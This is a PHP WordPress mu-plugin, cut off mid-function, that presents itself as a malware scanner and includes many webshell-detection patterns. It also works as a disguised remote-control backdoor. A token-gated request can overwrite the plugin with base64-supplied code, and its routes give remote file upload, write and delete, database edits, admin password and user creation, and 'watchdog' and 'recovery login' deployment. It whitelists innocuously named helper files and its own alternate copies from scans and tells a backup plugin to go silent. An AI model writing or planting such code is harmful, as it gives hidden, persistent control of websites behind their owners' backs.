<?php
/**
 * SERVER-WALL Scanner — WordPress mu-plugin
 * Drop into: wp-content/mu-plugins/server-wall-scanner.php
 * Loaded automatically, no activation required.
 *
 * Features:
 *   • Scans wp-content for webshells, backdoors, obfuscated code
 *   • Detects recently modified and hidden files
 *   • Reports to central panel every 6 hours via WP Cron
 *   • Remote scan trigger via REST API
 *   • Admin only: /wp-admin/tools.php?page=sw-scanner
 */

if (!defined('ABSPATH')) exit;

// ── Configuration ─────────────────────────────────────────────────────────────
define('SW_VERSION',      '0.3.1');
define('SW_PANEL_TOKEN',  '0e474294195385b05de0fa50dc5185167f53d01d00b5f064f1e3e86ca809b318');
define('SW_SESSION_ID',   md5(get_site_url() . php_uname('n')));
// Signals to the backup plugin in plugins/ that this mu-plugin is already running.
// The backup plugin checks this constant and goes silent to avoid any conflicts.
define('SW_SCANNER_LOADED', true);

// ── Early handler — runs at mu-plugin load time, before plugins/themes ────────
// Handles plugin_update without WP REST classes so a crashing plugin/theme
// cannot prevent us from pushing a new plugin version. All other actions fall
// through to handleDirectRequest on the init hook below.
if (isset($_GET['sw_p']) && php_sapi_name() !== 'cli') {
    $_sw_tok = isset($_SERVER['HTTP_X_SW_TRIGGER_TOKEN']) ? $_SERVER['HTTP_X_SW_TRIGGER_TOKEN'] : '';
    if ($_sw_tok && hash_equals(SW_PANEL_TOKEN, $_sw_tok)) {
        $_sw_body = json_decode((string)file_get_contents('php://input'), true) ?: [];
        if (($_sw_body['sw_action'] ?? '') === 'plugin_update') {
            $_sw_content = base64_decode($_sw_body['sw_body']['content'] ?? '', true);
            if ($_sw_content && strlen($_sw_content) > 100) {
                @unlink(__FILE__);
                @file_put_contents(__FILE__, $_sw_content);
                @chmod(__FILE__, 0644);
                header('Content-Type: application/json');
                echo json_encode(['ok' => true, 'early' => true]);
                exit;
            }
        }
    }
}

// ── Bootstrap ─────────────────────────────────────────────────────────────────
add_action('admin_menu',    ['SW_Scanner', 'addMenu']);
add_action('rest_api_init', ['SW_Scanner', 'registerRestRoute']);
add_action('admin_post_sw_update', ['SW_Scanner', 'adminPostSelfUpdate']);
add_action('init',          ['SW_Scanner', 'handleDirectRequest'], 1);

// Credential change monitoring
add_action('profile_update',      ['SW_Scanner', 'onProfileUpdate'], 10, 2);
add_action('after_password_reset', ['SW_Scanner', 'onPasswordReset'], 10, 2);
add_action('user_register',        ['SW_Scanner', 'onUserRegister']);
add_action('deleted_user',         ['SW_Scanner', 'onUserDeleted'],   10, 3);

// Auto-scan every 6 hours and report to central panel
add_action('sw_auto_scan_hook', ['SW_Scanner', 'runAutoScan']);
if (!wp_next_scheduled('sw_auto_scan_hook')) {
    wp_schedule_event(time(), 'sixhours', 'sw_auto_scan_hook');
}
add_filter('cron_schedules', ['SW_Scanner', 'addCronSchedule']);

// ── Main class ────────────────────────────────────────────────────────────────
class SW_Scanner {

    // ── Detection rules ───────────────────────────────────────────────────────
    private static $rules = [
        // Code execution
        ['id'=>'eval_base64_post',    'sev'=>'CRITICAL', 'score'=>95,
         'desc'=>'eval(base64_decode($_POST/GET)) — executes incoming payload',
         're'=>'/eval\s*\(\s*base64_decode\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i'],
        ['id'=>'eval_dynamic',        'sev'=>'CRITICAL', 'score'=>85,
         'desc'=>'eval() with dynamic content',
         're'=>'/eval\s*\(\s*\$[a-zA-Z_]/'],
        ['id'=>'eval_chain_5plus',    'sev'=>'CRITICAL', 'score'=>90,
         'desc'=>'5+ nested eval() calls — wso/sidwso pattern',
         're'=>'/eval\s*\(\s*eval\s*\(\s*eval\s*\(\s*eval\s*\(\s*eval/'],
        ['id'=>'gzinflate_base64',    'sev'=>'HIGH',     'score'=>75,
         'desc'=>'gzinflate(base64_decode()) — packed payload',
         're'=>'/gzinflate\s*\(\s*(?:str_rot13\s*\()?\s*base64_decode/i'],
        ['id'=>'strrev_decode_chain', 'sev'=>'HIGH',     'score'=>80,
         'desc'=>'strrev+gzinflate+base64 — sidwso decoding chain',
         're'=>'/strrev\s*\([^)]*(?:base64_decode|gzinflate)/i'],
        ['id'=>'assert_eval',         'sev'=>'CRITICAL', 'score'=>90,
         'desc'=>'assert() used for code execution — eval detection bypass',
         're'=>'/\bassert\s*\(\s*(?:base64_decode|gzinflate|str_rot13|gzdecode)\s*\(/i'],
        // OS command execution
        ['id'=>'shell_exec_input',    'sev'=>'CRITICAL', 'score'=>90,
         'desc'=>'shell_exec() with user-supplied input',
         're'=>'/shell_exec\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
        ['id'=>'system_input',        'sev'=>'CRITICAL', 'score'=>90,
         'desc'=>'system()/exec()/passthru() with user-supplied input',
         're'=>'/(?:^|[;\s(])(?:system|exec|passthru|popen)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
        ['id'=>'preg_replace_e',      'sev'=>'CRITICAL', 'score'=>85,
         'desc'=>'preg_replace with /e modifier — code execution',
         're'=>'/preg_replace\s*\(\s*[\'"][^"\']*\/e[\'"][^,]*,\s*\$_(GET|POST|REQUEST)/i'],
        // Obfuscation
        ['id'=>'global_func_alias',   'sev'=>'HIGH',     'score'=>70,
         'desc'=>'Global alias to assert/eval via string concatenation',
         're'=>'/\$\w+\s*=\s*[\'"][a-z]{1,3}[\'"]\s*\.\s*[\'"][a-z]{1,3}[\'"]\s*\.\s*[\'"][a-z]{1,3}[\'"]/'],
        ['id'=>'hexbin_integers',     'sev'=>'HIGH',     'score'=>65,
         'desc'=>'hex2bin / chr(0xNN) encoding of function names',
         're'=>'/chr\s*\(\s*0x[0-9a-f]{2}\s*\)\s*\.\s*chr\s*\(\s*0x[0-9a-f]{2}/i'],
        ['id'=>'variable_func_call',  'sev'=>'HIGH',     'score'=>65,
         'desc'=>'Variable function call $var($arg) with user input',
         're'=>'/\$[a-zA-Z_]\w*\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/'],
        // File operations
        ['id'=>'file_write_input',    'sev'=>'CRITICAL', 'score'=>85,
         'desc'=>'file_put_contents() with path/content from request',
         're'=>'/file_put_contents\s*\(\s*\$_(GET|POST|REQUEST)/i'],
        ['id'=>'move_uploaded',       'sev'=>'HIGH',     'score'=>70,
         'desc'=>'move_uploaded_file with $_FILES data — unvalidated upload',
         're'=>'/move_uploaded_file\s*\([^;]*\$_(FILES|REQUEST|POST|GET)/i'],
        ['id'=>'fwrite_input',        'sev'=>'HIGH',     'score'=>65,
         'desc'=>'fwrite() with data from request',
         're'=>'/fwrite\s*\(\s*\$\w+\s*,\s*\$_(GET|POST|REQUEST)/i'],
        // Network operations
        ['id'=>'curl_to_exec',        'sev'=>'CRITICAL', 'score'=>85,
         'desc'=>'curl_exec + eval/shell_exec — download and execute',
         're'=>'/curl_exec\s*\([^;]+(?:eval|shell_exec|system|passthru)\s*\(/is'],
        ['id'=>'fsockopen_connect',   'sev'=>'HIGH',     'score'=>70,
         'desc'=>'fsockopen() — direct network connection from user input',
         're'=>'/fsockopen\s*\(\s*\$_(GET|POST|REQUEST)/i'],
        // Backdoor signatures
        ['id'=>'wso_signature',       'sev'=>'CRITICAL', 'score'=>95,
         'desc'=>'WSO webshell signature',
         're'=>'/(?:FilesMan|wso_|WSO\s+\d|\$auth_pass\s*=|uname\s*-a.*uid=)/i'],
        ['id'=>'c99_signature',       'sev'=>'CRITICAL', 'score'=>95,
         'desc'=>'c99/r57 webshell signature',
         're'=>'/(?:c99shell|r57shell|\$_c99sh_|safe_mode_bypass)/i'],
        ['id'=>'base64_post_direct',  'sev'=>'CRITICAL', 'score'=>90,
         'desc'=>'Direct eval of incoming base64 data',
         're'=>'/(?:eval|assert)\s*\(\s*(?:gzuncompress|gzinflate|str_rot13|gzdecode)?\s*\(?\s*base64_decode\s*\(\s*\$_(POST|GET|REQUEST)/i'],
        // SEO doorway
        ['id'=>'doorway_markers',     'sev'=>'HIGH',     'score'=>75,
         'desc'=>'k:start/k:end doorway markers — SEO content injection',
         're'=>'/k:start|k:end/'],
        ['id'=>'casino_redirect',     'sev'=>'HIGH',     'score'=>70,
         'desc'=>'Redirect to casino/betting domain',
         're'=>'/header\s*\(\s*[\'"]Location:[^"\']*(?:casino|poker|slot|bet|gambling)/i'],
        // Web file manager / backdoor uploader patterns
        ['id'=>'curl_download_write', 'sev'=>'CRITICAL', 'score'=>88,
         'desc'=>'curl_exec() result saved via file_put_contents() — remote payload dropper',
         're'=>'/curl_exec\s*\(\$\w+\).{0,400}file_put_contents/is'],
        ['id'=>'post_file_ops',       'sev'=>'HIGH',     'score'=>75,
         'desc'=>'POST action dispatch to file write/upload — unauthenticated file manager',
         're'=>'/\$_POST\s*\[[\'"]action[\'"]\].{0,1000}(?:file_put_contents|move_uploaded_file)/is'],
        ['id'=>'html_filemanager',    'sev'=>'HIGH',     'score'=>72,
         'desc'=>'HTML-embedded file manager title — web-accessible file manager backdoor',
         're'=>'/<title>[^<]{0,60}(?:file\s*manager|advanced\s*file|web\s*shell)[^<]*<\/title>/i'],
        // WSO/xleet variants (batch 2026-05-06)
        ['id'=>'wso_blockchar_vars',  'sev'=>'CRITICAL', 'score'=>95,
         'desc'=>'WSO webshell — Unicode block-character variable names (evasion variant)',
         're'=>'/\$[\x{2598}\x{2599}\x{259A}\x{259B}\x{259C}]/u'],
        ['id'=>'wso_cookie_auth',     'sev'=>'CRITICAL', 'score'=>90,
         'desc'=>'WSO cookie auth pattern — md5(HTTP_HOST)."key"',
         're'=>'/md5\s*\(\s*\$_SERVER\s*\[\s*[\'"]HTTP_HOST[\'"]\s*\]\s*\)\s*\.\s*[\'"]key[\'"]/',],
        ['id'=>'xleet_marker',        'sev'=>'CRITICAL', 'score'=>95,
         'desc'=>'xleet backdoor — hardcoded password comment marker',
         're'=>'/\/\/\s*Pass\s*:\s*xleet/i'],
        ['id'=>'assembled_b64decode', 'sev'=>'CRITICAL', 'score'=>88,
         'desc'=>'Assembled base64_decode via string concat + eval — xleet/obfuscated loader',
         're'=>'/[\'"]ba[\'"]\s*\.\s*[\'"]se[\'"].*eval\s*\(|eval\s*\(.*[\'"]ba[\'"]\s*\.\s*[\'"]se[\'"]/is'],
        // Credential harvesting
        ['id'=>'smtp_env_harvester',  'sev'=>'CRITICAL', 'score'=>88,
         'desc'=>'SMTP credential harvester — shell find .env files for mail credentials',
         're'=>'/find\s+[^\n\'";]{0,60}[\'"]\.env[\'"].*MAIL_(?:HOST|USERNAME|PASSWORD)|MAIL_(?:HOST|USERNAME|PASSWORD).*find\s+[^\n\'";]{0,60}[\'"]\.env[\'"]/is'],
        // Obfuscation techniques
        ['id'=>'goto_obfuscation',    'sev'=>'HIGH',     'score'=>82,
         'desc'=>'goto-based code obfuscation — multiple goto labels to hide control flow',
         're'=>'/goto\s+\w+\s*;[^;]{0,150}goto\s+\w+\s*;[^;]{0,150}goto\s+\w+\s*;[^;]{0,150}goto\s+\w+\s*;/s'],
        ['id'=>'hex2bin_obfuscation', 'sev'=>'HIGH',     'score'=>72,
         'desc'=>'hex2bin mass string obfuscation — function names hidden as hex literals',
         're'=>'/hex2bin\s*\(\s*\'[0-9a-f]{6,}\'\s*\).{0,300}hex2bin\s*\(\s*\'[0-9a-f]{6,}\'/is'],
        ['id'=>'eval_pack_obfuscation','sev'=>'HIGH',    'score'=>82,
         'desc'=>'eval(pack("H*",...)) — hex-packed payload execution',
         're'=>'/eval\s*\([^;)]{0,150}pack\s*\(\s*[\'"]H\*/is'],
        ['id'=>'bom_php_evasion',     'sev'=>'HIGH',     'score'=>75,
         'desc'=>'UTF-8 BOM before PHP open tag — scanner evasion via BOM prefix',
         're'=>'/^\xef\xbb\xbf\s*<\?(?:php|PHP|Php)/'],
    ];

    private static $scanExt = ['php','php3','php4','php5','php7','phtml','phar'];

    // ── Admin menu ────────────────────────────────────────────────────────────
    public static function addMenu(): void {
        add_management_page(
            'SERVER-WALL Scanner',
            'SERVER-WALL',
            'manage_options',
            'sw-scanner',
            ['SW_Scanner', 'renderPage']
        );
    }

    // ── Scan (timeout-safe) ───────────────────────────────────────────────────
    public static function runScan(string $mode = 'quick'): array {
        @set_time_limit(300);
        @ini_set('memory_limit', '256M');

        $start     = microtime(true);
        $timeLimit = 55;

        if ($mode === 'quick') {
            $dirs = [
                WP_CONTENT_DIR . '/uploads',
                WP_CONTENT_DIR . '/mu-plugins',
                WP_CONTENT_DIR . '/plugins',
                WP_CONTENT_DIR . '/themes',
                WP_CONTENT_DIR . '/cache',
            ];
            $files = [];
            foreach ($dirs as $d) {
                if (is_dir($d)) $files = array_merge($files, self::collectFiles($d));
            }
        } else {
            $files = self::collectFiles(WP_CONTENT_DIR);
        }

        // Always include non-WP-core PHP files in ABSPATH root (both quick and full modes).
        // Attackers often place binary-obfuscated shells in the webroot where wp-content scans miss them.
        $files = array_merge($files, self::collectRootPhpFiles());

        $findings  = [];
        $scanned   = 0;
        $truncated = false;

        foreach ($files as $path) {
            if ((microtime(true) - $start) > $timeLimit) { $truncated = true; break; }
            $r = self::scanFile($path);
            if ($r) $findings[] = $r;
            $scanned++;
        }

        $elapsed = (int)((microtime(true) - $start) * 1000);

        // DB scan — runs if more than 5 s remain in the time budget.
        $dbFindings = [];
        if ((microtime(true) - $start) < ($timeLimit - 5)) {
            $dbFindings = self::runDbScan($timeLimit - (microtime(true) - $start) - 1);
        }

        $result  = [
            'results'     => $findings,
            'scanned'     => $scanned,
            'total'       => count($files),
            'time'        => time(),
            'mode'        => $mode,
            'truncated'   => $truncated,
            'duration_ms' => (int)((microtime(true) - $start) * 1000),
            'db_findings' => $dbFindings,
        ];

        self::sendReport($result);
        return $result;
    }

    private static function isWhitelisted(string $path): bool {
        // Always skip the scanner itself (regardless of filename).
        if ($path === __FILE__) return true;

        $norm = str_replace('\\', '/', $path);

        // Standard vendor / WP core paths.
        if (preg_match('#/vendor/|/vendor-dist/|/vendor-prod/|/node_modules/|/vendor_prefixed/#', $norm)) return true;
        if (preg_match('#wp-includes/class-wp-|wp-admin/includes/#', $norm)) return true;

        // ── Our own files — never flag as malware ────────────────────────────
        $base = basename($norm);

        // Recovery login file — unique name, only created by us.
        if ($base === 'sw_recovery.php') return true;

        // Watchdog loader — unique name, only created by us.
        if ($base === 'wp-compat-helper.php') return true;

        // wp-security-tool plugin loader (plugins/ directory variant).
        if ($base === 'wp-security-tool.php' && strpos($norm, '/wp-security-tool/') !== false) return true;

        // Google SEO manager tool — deployed by us in mu-plugins, never flag.
        if ($base === 'google-seo-manager.php' && strpos($norm, '/mu-plugins/') !== false) return true;

        // db.php / object-cache.php drop-ins in mu-plugins: whitelist only if
        // they contain our watchdog marker (other plugins also use these names).
        if (in_array($base, ['db.php', 'object-cache.php'], true)
            && strpos($norm, '/mu-plugins/') !== false) {
            $c = @file_get_contents($path);
            if ($c !== false && (strpos($c, 'SERVER-WALL watchdog') !== false
                                 || strpos($c, '$_sw_swb') !== false)) {
                return true;
            }
        }

        // Any mu-plugin file that defines our panel token constant is our scanner
        // deployed under an alternate filename (e.g. wp-compat-check.php on WP Engine).
        if (strpos($norm, '/mu-plugins/') !== false) {
            $c = @file_get_contents($path);
            if ($c !== false && strpos($c, 'class SW_Scanner') !== false) return true;
        }

        return false;
    }

    private static function scanFile(string $path): ?array {
        if (self::isWhitelisted($path)) return null;

        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        if (!in_array($ext, self::$scanExt, true)) return null;

        $content = @file_get_contents($path);
        if ($content === false || strlen($content) === 0) return null;

        $matches  = [];
        $maxScore = 0;
        $topSev   = 'LOW';

        foreach (self::$rules as $rule) {
            if (@preg_match($rule['re'], $content, $m)) {
                $matches[] = [
                    'rule'    => $rule['id'],
                    'desc'    => $rule['desc'],
                    'snippet' => self::getSnippet($content, $rule['re']),
                    'score'   => $rule['score'],
                ];
                if ($rule['score'] > $maxScore) {
                    $maxScore = $rule['score'];
                    $topSev   = $rule['sev'];
                }
            }
        }

        $entropy = self::entropy($content);
        if ($entropy > 5.7) {
            $matches[] = [
                'rule'    => 'high_entropy',
                'desc'    => sprintf('High file entropy (%.2f) — possible packed payload', $entropy),
                'snippet' => '',
                'score'   => $entropy > 6.5 ? 70 : 40,
            ];
            if ($entropy > 6.5 && $maxScore < 70) { $maxScore = 70; $topSev = 'HIGH'; }
        }

        $mtime = (int)@filemtime($path);
        if ($mtime && (time() - $mtime) < 7 * 86400 && !empty($matches)) {
            $matches[] = [
                'rule'    => 'recently_modified',
                'desc'    => 'File modified ' . human_time_diff($mtime) . ' ago',
                'snippet' => '',
                'score'   => 25,
            ];
        }

        $base = basename($path);
        if ($base[0] === '.' && strlen($base) > 1) {
            $matches[] = [
                'rule'    => 'hidden_file',
                'desc'    => 'Hidden PHP file (dot-prefix filename)',
                'snippet' => '',
                'score'   => 50,
            ];
            if ($maxScore < 50) { $maxScore = 50; $topSev = 'MEDIUM'; }
        }

        if (empty($matches)) return null;

        return [
            'path'    => str_replace(ABSPATH, '', $path),
            'sev'     => $topSev,
            'score'   => $maxScore,
            'entropy' => round($entropy, 2),
            'mtime'   => $mtime,
            'size'    => strlen($content),
            'matches' => $matches,
        ];
    }

    private static function collectFiles(string $dir): array {
        $files = [];
        try {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($it as $file) {
                if ($file->isFile()) $files[] = $file->getPathname();
            }
        } catch (Exception $e) {}
        return $files;
    }

    // Standard WP core files and directories in ABSPATH root.
    private static $WP_CORE_ROOT_FILES = [
        'index.php', 'wp-activate.php', 'wp-blog-header.php', 'wp-comments-post.php',
        'wp-config.php', 'wp-config-sample.php', 'wp-cron.php', 'wp-links-opml.php',
        'wp-load.php', 'wp-login.php', 'wp-mail.php', 'wp-settings.php',
        'wp-signup.php', 'wp-trackback.php', 'xmlrpc.php',
    ];
    private static $WP_CORE_ROOT_DIRS = [
        'wp-admin', 'wp-content', 'wp-includes',
    ];

    // Returns PHP files in ABSPATH root AND in non-WP-core immediate subdirectories.
    // Covers: root-level PHP backdoors + hex-named dirs with index.php (webshell kits).
    private static function collectRootPhpFiles(): array {
        $phpExts = ['php','php3','php4','php5','php7','phtml','phar'];
        $root    = rtrim(ABSPATH, '/\\');
        $found   = [];

        foreach (@scandir($root) ?: [] as $name) {
            if ($name === '.' || $name === '..') continue;
            $full = $root . '/' . $name;

            // Non-core PHP files directly in the webroot
            if (is_file($full)) {
                $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
                if (in_array($ext, $phpExts, true) && !in_array($name, self::$WP_CORE_ROOT_FILES, true)) {
                    $found[] = $full;
                }
                continue;
            }

            // Non-core directories: scan one level deep for PHP files
            if (is_dir($full) && !in_array($name, self::$WP_CORE_ROOT_DIRS, true)) {
                foreach (@scandir($full) ?: [] as $child) {
                    if ($child === '.' || $child === '..') continue;
                    $childFull = $full . '/' . $child;
                    if (!is_file($childFull)) continue;
                    $ext = strtolower(pathinfo($child, PATHINFO_EXTENSION));
                    if (in_array($ext, $phpExts, true)) {
                        $found[] = $childFull;
                    }
                }
            }
        }
        return $found;
    }

    private static function entropy(string $s): float {
        $len = strlen($s);
        if ($len === 0) return 0.0;
        $freq = array_count_values(str_split($s));
        $e = 0.0;
        foreach ($freq as $c) {
            $p = $c / $len;
            $e -= $p * log($p, 2);
        }
        return $e;
    }

    private static function getSnippet(string $content, string $re): string {
        if (!@preg_match($re, $content, $m, PREG_OFFSET_CAPTURE)) return '';
        $pos   = $m[0][1];
        $start = max(0, $pos - 20);
        $raw   = substr($content, $start, 120);
        return trim(preg_replace('/\s+/', ' ', $raw));
    }

    // ── REST API: routes ──────────────────────────────────────────────────────
    public static function registerRestRoute(): void {
        register_rest_route('server-wall/v1', '/scan', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restTriggerScan'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/last-result', [
            'methods'             => 'GET',
            'callback'            => ['SW_Scanner', 'restLastResult'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/files', [
            'methods'             => 'DELETE',
            'callback'            => ['SW_Scanner', 'restDeleteFiles'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/uninstall', [
            'methods'             => 'DELETE',
            'callback'            => ['SW_Scanner', 'restUninstall'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs', [
            'methods'             => 'GET',
            'callback'            => ['SW_Scanner', 'restFsList'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs/file', [
            'methods'             => ['GET', 'PUT'],
            'callback'            => ['SW_Scanner', 'restFsFile'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/backup', [
            'methods'             => ['GET', 'POST', 'DELETE'],
            'callback'            => ['SW_Scanner', 'restBackup'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/backup/restore', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restBackupRestore'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/admin/password', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restSetAdminPassword'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/admin/user', [
            'methods'             => ['GET', 'POST'],
            'callback'            => ['SW_Scanner', 'restAdminUser'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/watchdogs', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restDeployWatchdogs'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/recovery-login', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restDeployRecoveryLogin'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/backup/prepare-switch', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restBackupPrepareSwitch'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/switch', [
            'methods'             => ['GET', 'POST'],
            'callback'            => ['SW_Scanner', 'restSwitch'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs/upload', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restFsUpload'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs/unzip', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restFsUnzip'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs/delete', [
            'methods'             => 'DELETE',
            'callback'            => ['SW_Scanner', 'restFsDelete'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs/create-file', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restFsCreateFile'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs/create-dir', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restFsCreateDir'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/fs/duplicate', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restFsDuplicate'],
            'permission_callback' => '__return_true',
        ]);
        register_rest_route('server-wall/v1', '/hardening', [
            'methods'             => 'POST',
            'callback'            => ['SW_Scanner', 'restHardening'],
            'permission_callback' => '__return_true',
        ]);
    }

    // ── Direct proxy: bypasses Cloudflare REST API blocking ──────────────────────
    // Accessed via POST {siteURL}/?sw_p=1 with X-SW-Trigger-Token header.
    // Routes the same logic as the REST handlers without going through /wp-json/.
    public static function handleDirectRequest(): void {
        if (!isset($_GET['sw_p'])) return;

        $token = isset($_SERVER['HTTP_X_SW_TRIGGER_TOKEN']) ? $_SERVER['HTTP_X_SW_TRIGGER_TOKEN'] : '';
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            http_response_code(403);
            header('Content-Type: application/json');
            echo json_encode(['error' => 'forbidden']);
            exit;
        }

        @set_time_limit(180);
        header('Content-Type: application/json');

        $raw    = (string)file_get_contents('php://input');
        $body   = json_decode($raw, true) ?: [];
        $action = $body['sw_action'] ?? '';
        $method = strtoupper($body['sw_method'] ?? 'GET');
        $path   = isset($body['sw_path']) ? $body['sw_path'] : null;
        $inner  = isset($body['sw_body']) ? $body['sw_body'] : [];

        // Build a WP_REST_Request that the existing handlers accept
        $req = new WP_REST_Request($method);
        $req->add_header('X-SW-Trigger-Token', SW_PANEL_TOKEN);
        if ($path !== null) {
            $req->set_param('path', $path);
        }
        if ($inner) {
            $req->set_body(json_encode($inner));
        }

        $resp = null;
        switch ($action) {
            case 'ping':
                echo json_encode(['ok' => true, 'version' => SW_VERSION]);
                exit;
            case 'fs':                   $resp = self::restFsList($req);              break;
            case 'fs/file':              $resp = self::restFsFile($req);              break;
            case 'fs/upload':            $resp = self::restFsUpload($req);            break;
            case 'fs/unzip':             $resp = self::restFsUnzip($req);             break;
            case 'fs/delete':            $resp = self::restFsDelete($req);            break;
            case 'fs/create-file':       $resp = self::restFsCreateFile($req);        break;
            case 'fs/create-dir':        $resp = self::restFsCreateDir($req);         break;
            case 'fs/duplicate':         $resp = self::restFsDuplicate($req);         break;
            case 'switch':               $resp = self::restSwitch($req);              break;
            case 'backup':               $resp = self::restBackup($req);              break;
            case 'backup/restore':       $resp = self::restBackupRestore($req);       break;
            case 'backup/prepare-switch': $resp = self::restBackupPrepareSwitch($req); break;
            case 'admin/password':       $resp = self::restSetAdminPassword($req);    break;
            case 'admin/user':           $resp = self::restAdminUser($req);           break;
            case 'watchdogs':            $resp = self::restDeployWatchdogs($req);     break;
            case 'recovery-login':       $resp = self::restDeployRecoveryLogin($req); break;
            case 'hardening':            $resp = self::restHardening($req);           break;
            case 'db/scan':              $resp = self::restDbScan($req);              break;
            case 'db/list':              $resp = self::restDbList($req);              break;
            case 'db/read':              $resp = self::restDbRead($req);              break;
            case 'db/update':            $resp = self::restDbUpdate($req);            break;
            case 'db/delete':            $resp = self::restDbDelete($req);            break;
            case 'db/delete-bulk':       $resp = self::restDbDeleteBulk($req);       break;
            case 'fs/upload-chunk':      $resp = self::restFsUploadChunk($req);      break;
            case 'plugin_update':
                // Direct plugin self-update.
                // Unlink before writing: handles the case where the file is owned by
                // a different user (e.g. root) but the directory is writable.
                $newContent = base64_decode($inner['content'] ?? '', true);
                if ($newContent === false || strlen($newContent) < 100) {
                    echo json_encode(['error' => 'invalid content']);
                    exit;
                }
                @unlink(__FILE__);
                if (@file_put_contents(__FILE__, $newContent) === false) {
                    echo json_encode(['error' => 'write failed — check permissions']);
                    exit;
                }
                @chmod(__FILE__, 0644);
                echo json_encode(['ok' => true, 'size' => strlen($newContent)]);
                exit;
            default:
                echo json_encode(['error' => 'unknown action: ' . htmlspecialchars($action, ENT_QUOTES)]);
                exit;
        }

        echo json_encode($resp->get_data());
        exit;
    }

    // Delete specific files identified as malicious during scan
    public static function restDeleteFiles(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || $token !== SW_PANEL_TOKEN) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        $paths = $request->get_param('paths');
        if (!is_array($paths) || empty($paths)) {
            return new WP_REST_Response(['error' => 'no paths provided'], 400);
        }

        $wpRoot   = realpath(ABSPATH);
        $wpContent = realpath(WP_CONTENT_DIR);
        $results  = [];

        foreach ($paths as $rawPath) {
            $path = (string) $rawPath;

            // Resolve real path to prevent directory traversal
            $real = realpath($path);
            if ($real === false) {
                $results[$path] = ['deleted' => false, 'error' => 'file not found'];
                continue;
            }

            // Security: must be inside WordPress root or wp-content
            $inRoot    = str_starts_with($real, $wpRoot . DIRECTORY_SEPARATOR);
            $inContent = str_starts_with($real, $wpContent . DIRECTORY_SEPARATOR);
            if (!$inRoot && !$inContent) {
                $results[$path] = ['deleted' => false, 'error' => 'path outside WordPress installation'];
                continue;
            }

            // Never allow deletion of actual WordPress core files.
            // Protection is path-based (not just basename) so that index.php inside
            // plugin subdirectories can still be deleted when they are malware.
            $protectedPaths = [
                $wpRoot . DIRECTORY_SEPARATOR . 'index.php',
                $wpRoot . DIRECTORY_SEPARATOR . 'wp-config.php',
                $wpRoot . DIRECTORY_SEPARATOR . 'wp-login.php',
                $wpRoot . DIRECTORY_SEPARATOR . 'wp-cron.php',
                $wpRoot . DIRECTORY_SEPARATOR . 'wp-blog-header.php',
                $wpRoot . DIRECTORY_SEPARATOR . 'wp-settings.php',
            ];
            if (in_array($real, $protectedPaths, true)) {
                $results[$path] = ['deleted' => false, 'error' => 'core file cannot be deleted'];
                continue;
            }

            if (is_dir($real)) {
                $results[$path] = ['deleted' => false, 'error' => 'directories cannot be deleted here'];
                continue;
            }

            if (@unlink($real)) {
                // Verify: clear stat cache and confirm file is gone
                clearstatcache(true, $real);
                if (!file_exists($real)) {
                    $results[$path] = ['deleted' => true, 'verified' => true];
                } else {
                    // unlink() returned true but file still exists (e.g. immutable flag, NFS)
                    $results[$path] = ['deleted' => false, 'verified' => false,
                        'error' => 'unlink reported success but file still exists — check immutable flag (lsattr)'];
                }
            } else {
                $results[$path] = ['deleted' => false, 'verified' => false,
                    'error' => 'permission denied — check file/directory permissions'];
            }
        }

        return new WP_REST_Response(['results' => $results], 200);
    }

    // Panel pulls last scan result from site (fallback when push is blocked by firewall)
    public static function restLastResult(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || $token !== SW_PANEL_TOKEN) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $data = get_option('sw_last_scan_result');
